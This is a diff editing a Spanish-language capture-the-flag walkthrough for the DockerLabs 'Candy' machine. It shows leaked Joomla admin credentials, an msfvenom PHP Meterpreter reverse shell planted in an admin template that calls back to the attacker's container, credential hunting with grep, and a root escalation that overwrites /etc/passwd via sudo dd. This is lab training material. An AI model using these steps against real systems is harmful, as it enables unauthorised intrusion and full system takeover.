@@ -2,29 +2,22 @@
 
 > Dificultad: Fácil
 
-Antes que nada, en mi caso, decidí mapear el puerto 80 del contenedor de Docker al 9090 del
-host para así poder acceder a la web-app gráficamente, sin mayores complicaciones:  
+Luego de descargar el ZIP, revisé el contenido y lo descomprimí en la carpeta actual. Borré el script automático, cargué la imagen del TAR con Docker. Lanzé el contenedor mapeando el puerto 80 al 9090 del hoste para así poder acceder a la web-app gráficamente desde el navegador, sin mayores complicaciones:  
 
 ```
 unzip -l <archivo.zip>
 unzip <archivo.zip>
 rm -f <autoscript.sh>
 sudo docker load -i <archivo.tar>
-sudo docker run --rm -p 9090:80 <imagen>
+sudo docker run --rm ... -p 9090:80 <imagen>
 ```
 
-[IMG]
-
-La IP del contenedor de Candy es 172.18.0.2.  
-
-Por otro lado, tengo otro contenedor Kali atacante preparado con IP 172.18.0.3:  
-
-[IMG]    
+La IP de Candy-víctima es 172.18.0.2 y Kali-atacante, IP 172.18.0.3.
 
 ___
 
 ### FASE RECOPILACIÓN / ENUMERACIÓN:
-Con nmap descubrimos que hay un solo puerto habilitado escuchando con servicio: el 80,
+Con nmap descubrimos que hay un solo puerto habilitado escuchando: el 80,
 una web app.  
 En la sub-fase de Enumeracion Web, una de las cosas más básicas es buscar por el recurso
 “robots.txt” el cual define qué directorios de la web-app no pueden encontrarse por
@@ -37,17 +30,14 @@ Parecieran ser las credenciales de admin de la app.
 
 ___
 
-#### FASE EXPLOTACIÓN (Ganar Acceso):
+#### FASE EXPLOTACIÓN (Ganar Acceso):  
+
 La password aparenta estar en formato base64, por lo tanto hay que descodificarla. He aquí
 dos maneras:
 >    1. Consultando a alguna IA
 >    2.  echo “c2FubHVpczEyMzQ1” | base64 -d
 
-[IMG]
-
-Queda `admin:sanluis12345`. Las probamos y tenemos acceso.  
-
-[IMG]  
+Queda `admin:sanluis12345`. Las probamos y conseguimos acceso a la app. Primer Footholding.
 
 ___
 
@@ -58,12 +48,12 @@ Revisando un poco, vamos haciendo fingerprinting de los activos. La mayoría de 
 >    email = realmail@dockerlabs.com
 >    ID = 615
   
-Luego, encontramos que la versión de Joomla es 4.1.1 con un Manifest Data de 4.1.2. Esto podría ser un vector relevante. Podríamos buscar un exploit, por ejemplo con la herramienta searchsploit, en GitHub, etc.  
+Luego, encontramos que la versión de Joomla es 4.1.1 con un Manifest Data de 4.1.2. Esto podría ser un vector de ataque. Podríamos buscar un exploit, por ejemplo con la herramienta searchsploit, en GitHub, etc.  
 
-Antes que nada, probamos un camino conocido para explotar Joomla: mediante sus plantillas. Inyectando una web-shell en alguna de ellas (en su index.php, por ejemplo) podríamos llegar a tener acceso inicial:  
+Antes que nada, probaremos un camino conocido para explotar Joomla: mediante sus plantillas. Inyectando una web-shell en alguna de ellas (en su index.php, por ejemplo) podríamos llegar a tener acceso inicial:  
 
-> Vamos a Sistema —> Extesiones —> Admin Templates #chequear>  
-> Ahora a “/administrator/templates/atum/index.php”  
+>    Vamos a Sistema —> Extesiones —> Admin Templates #chequear>  
+>    Ahora a “/administrator/templates/atum/index.php”  
 
 [IMG de la Plantilla]  
 
@@ -72,8 +62,7 @@ msfvenom. En mi caso, lo hice con:
 
 `msfvenom -p php/meterpreter/reverse_tcp LHOST=172.18.0.3 LPORT=6660 R -o web-shell.php`   
 
-> La R corresponde a “-f raw”. Significa un formato “en crudo”, el cual es necesario para archivos
-PHP.
+> La R corresponde a “-f raw”. Significa un formato “en crudo”, el cual es necesario para archivos PHP.  
 
 Probamos, ahora sí, inyectar (copiar el código) de la web-shell en **“/administrator/templates/atum/index.php”** y guardamos la plantilla.    
 
@@ -97,79 +86,79 @@ Una vez que el exploit está a la escucha hay que re-lanzar la webshell para log
 
 [IMG]  
 
-Tenemos acceso inicial.    
+Tenemos un segundo Footholding.    
 
 #### POST-EXPLOTACIÓN (elevar privilegios):
-Una vez dentro con Meterpreter, se pueden hacer muchas cosas. Primero verificar usuario:  
+Una vez dentro con Meterpreter, se pueden hacer muchas cosas. Primero verificamos usuario:  
 
-    `getuid`    
+`getuid`    
 
 También podemos ejecutar `shell`:  
-    `whoami`  
-    `id`
-  
-Somos www-data: usuario típico administrador del servidor web del sistema y por defecto sin privilegios, sin consola de login. Luego, enumeramos usuarios del sistema con:  
+`whoami`  
+`id`
 
-    `cat /etc/passwd`
+Somos `www-data`, usuario típico administrador del servidor web del sistema, por defecto sin privilegios ni consola de login. Luego, enumeramos usuarios del sistema con:  
+
+`cat /etc/passwd`
 
 [IMG]  
 
-Obtenemos dos de relevancia:
-> 1. luisillo
-> 2. ubuntu
+Obtenemos dos de relevancia:  
+>    1. luisillo  
+>    2. ubuntu  
 
 Ahora que tenemos por donde empezar a escalar privilegios, hay que pensar en buscar
 **credenciales** dentro del sistema. Puesto que no hay un servidor SSH con el cual se pueda
 pensar en realizar un ataque de diccionario (con rockyou.txt, etc), probamos buscarlas con
 grep:  
 
-    `grep -RIi luisillo / 2>/dev/null`  
+`grep -RIi luisillo / 2>/dev/null`  
 
-> /var/backups/hidden/otro_caramelo.txt:$db_user = 'luisillo';
+> /var/backups/hidden/otro_caramelo.txt:$db_user = 'luisillo';  
 > /var/backups/hidden/otro_caramelo.txt:$db_pass = 'luisillosuperpassword';  
 
-> -R es para buscar recusivamente  
-> –I para ignorar binarios  
-> –i para ignorar los cases.  
-> 2>/dev/null envía la salida de errores estándar a /dev/null, es decir no la muestra, la descarta.  
+>   -R es para buscar recusivamente  
+>   –I para ignorar binarios  
+>   –i para ignorar los cases.  
+>   2>/dev/null envía la salida de errores estándar a /dev/null, es decir no la muestra, la descarta.  
 
 Finalmente, obtenemos las credenciales `luisillo:luisillosuperpassword`  
-Siendo www-data probamos desde Meterpreter:  
+Siendo `www-data`, probamos desde Meterpreter:  
 
 `shell`  
 `su – luisillo`  
 `Password --> luisillosuperpassword`  
 
-Logramos acceso.  
+Conseguimos acceso.  
 
 Una vez como “luisillo”, probamos buscamos privilegios sudo con `sudo –l` y notamos que tenemos privilegios de superusuario sin password con el binario “/bin/dd”. Usaremos eso.  
 
 Investigando un poco nos damos cuenta que con dd se pueden escribir archivos. Si lo usamos
 con sudo escribiremos como root. Teniendo esto en cuenta, podemos pensar en escribir una
-copia de /etc/passwd modificada a nuestros intereses (como cambiar la password de root) y sobre-escribir el fichero legítimo como root usando dd. Primero creamos el hash para la password con openssl:  
+copia de /etc/passwd modificada a nuestros intereses (como cambiar la password de root) y sobreescribir el fichero legítimo como root usando dd. Primero creamos el hash para la password con openssl:  
 
-    `which openssl`  
-    `openssl passwd`  
+`which openssl`  
+`openssl passwd`  
 
 Tecleamos `1234` + Enter y nos devuelve un hash para dicha contraseña.  
 
 Copiamos /etc/passwd con:  
 
-    `cp /etc/passwd /tmp/passwd-malo`  
+`cp /etc/passwd /tmp/passwd-malo`  
     
 Una vez hecho, hacemos:  
 
-    `nano /tmp/passwd-malo`
+`nano /tmp/passwd-malo`
 
 Borramos la “x” de root correspondiente a la password y la cambiamos por nuestro hash. Guardamos.  
 
 Ahora, probamos:  
 
-    `sudo /bin/dd if=/tmp/passwd-malo of=/etc/passwd`  
+`sudo /bin/dd if=/tmp/passwd-malo of=/etc/passwd`  
 
 Vemos que no hay problema e intentamos:  
 
-    `su -`  
-    `Password --> 1234`    
+`su -`  
+`Password --> 1234`    
 
-Logrado: somos root.
+Logrado. Somos root.
